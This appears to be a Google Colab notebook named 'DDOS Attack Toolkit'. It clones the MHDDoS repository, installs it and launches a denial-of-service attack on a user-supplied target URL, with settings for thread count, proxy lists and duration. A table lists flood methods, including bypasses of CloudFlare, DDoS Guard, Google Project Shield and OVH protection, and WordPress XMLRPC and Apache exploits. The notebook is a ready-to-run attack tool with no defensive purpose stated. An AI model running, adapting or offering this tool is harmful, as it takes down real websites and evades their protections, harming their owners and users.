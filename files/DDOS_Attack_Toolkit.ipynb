{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/TheCaduceus/thecaduceus.github.io/blob/main/files/DDOS_Attack_Toolkit.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from google.colab import output\n",
        "# User Data INPUT\n",
        "Repo_author = \"MHProDev\" #@param [\"TheCaduceus\", \"MHProDev\"]\n",
        "Use_repo = \"MHDDoS\" #@param [\"MHDDoS\"]\n",
        "METHOD = \"OVH\" #@param [\"OVH\", \"CFBUAM\", \"CFB\", \"GET\", \"POST\", \"STRESS\", \"DYN\", \"DOWNLOADER0\", \"SLOW\", \"HEAD\", \"NULL\", \"COOKIE\", \"PPS\", \"EVEN\", \"GSB\", \"DGB\", \"AVB\", \"BOT\", \"APACHE\", \"XMLRPC\", \"BYPASS\", \"BOMB\", \"KILLER\"]\n",
        "TARGET_URL = \"\" #@param {type:\"string\"}\n",
        "THREADS = 10000 #@param {type:\"slider\", min:100, max:10000, step:1}\n",
        "Use_Proxy_List = \"socks5.txt\" #@param [\"socks5.txt\", \"socks4.txt\", \"socks3.txt\"]\n",
        "RPC = \"100\" #@param {type:\"string\"}\n",
        "DURATION_Seconds = \"500\" #@param {type:\"string\"}\n",
        "# Setup\n",
        "!git clone https://github.com/{Repo_author}/{Use_repo}.git\n",
        "%cd {Use_repo}\n",
        "!pip install -r requirements.txt\n",
        "output.clear()\n",
        "# Output\n",
        "print(\"--Attack Started!--\")\n",
        "!python3 start.py {METHOD} {TARGET_URL} 1 {THREADS} {Use_Proxy_List} {RPC} {DURATION_Seconds}\n"
      ],
      "metadata": {
        "cellView": "form",
        "id": "QZD-lnJLd6-i"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Methods:**\n",
        "```\n",
        "GET | GET Flood\n",
        "POST | POST Flood\n",
        "OVH | Bypass OVH\n",
        "STRESS | Send HTTP Packet With High Byte\n",
        "DYN | A New Method With Random SubDomain\n",
        "DOWNLOADER | A New Method of Reading data slowly\n",
        "SLOW | Slowloris Old Method of DDoS\n",
        "HEAD | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD\n",
        "NULL | Null UserAgent and ...\n",
        "COOKIE | Random Cookie PHP 'if (isset($_COOKIE))'\n",
        "PPS | Only 'GET / HTTP/1.1\\r\\n\\r\\n'\n",
        "EVEN | GET Method with more header\n",
        "GSB | Google Project Shield Bypass\n",
        "DGB | DDoS Guard Bypass\n",
        "AVB | Arvan Cloud Bypass\n",
        "BOT | Like Google bot\n",
        "APACHE | Apache Expliot\n",
        "XMLRPC | WP XMLRPC expliot (add /xmlrpc.php)\n",
        "CFB | CloudFlare Bypass\n",
        "CFBUAM | CloudFlare Under Attack Mode Bypass\n",
        "BYPASS | Bypass Normal AntiDDoS\n",
        "BOMB | Bypass with codesenberg/bombardier\n",
        "KILLER | run many threads to kill a target\n",
        "```"
      ],
      "metadata": {
        "id": "U9VZz9Eu1vt6"
      }
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "name": "DDOS Attack Toolkit.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyP4BvoR4DDPPby4PzP0FZm1",
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
